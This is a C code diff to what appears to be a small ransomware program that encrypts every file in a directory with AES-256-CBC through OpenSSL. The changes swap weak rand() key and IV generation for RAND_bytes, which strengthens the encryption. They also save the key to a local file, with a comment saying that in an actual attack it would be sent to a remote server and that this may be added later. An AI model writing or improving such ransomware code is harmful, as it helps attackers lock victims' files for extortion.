@@ -17,10 +17,7 @@ void encrypt(unsigned char *key, char *fileName) {
     
     unsigned char *iv = malloc(16); // IV is always 16 bytes
     // Generate the IV
-    int i;
-    for (i = 0; i < 16; i++) {
-         iv[i] = rand();
-    }
+    RAND_bytes(iv, 16);
 
     // Initiate cipher and store key/iv in it
     EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1);
@@ -106,7 +103,7 @@ void decrypt(unsigned char *key, char *fileName) {
         }
     }
 
-    // Cipher the block 
+    // Cipher the last block 
     EVP_DecryptFinal_ex(ctx, buffer_out, &out_len);
     fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
     EVP_CIPHER_CTX_cleanup(ctx);
@@ -123,15 +120,20 @@ int main () {
     int num_bytes = 32; // 256-bit key size
     unsigned char *key = malloc(num_bytes);
     char fileName[256];
+    FILE *f_key;
     // Our directory structure
     DIR *users;
     struct dirent *entry;
 
     // Generate the key
-    size_t i;
-    for (i = 0; i < num_bytes; i++) {
-         key[i] = rand();
-    }
+    RAND_bytes(key, 32);
+
+    // Write the key to a file -- in an actual attack, this would be sent to a super secret server
+    // I might add the functionality for this key to be sent to a server later on
+    f_key = fopen("key.txt", "wb");
+    fwrite(key, 1, 32, f_key);
+    fclose(f_key);
+
     char directory[] = "files/";
     char *pathLocation = malloc(strlen(directory) + strlen(fileName) + 1);
     users = opendir(directory);
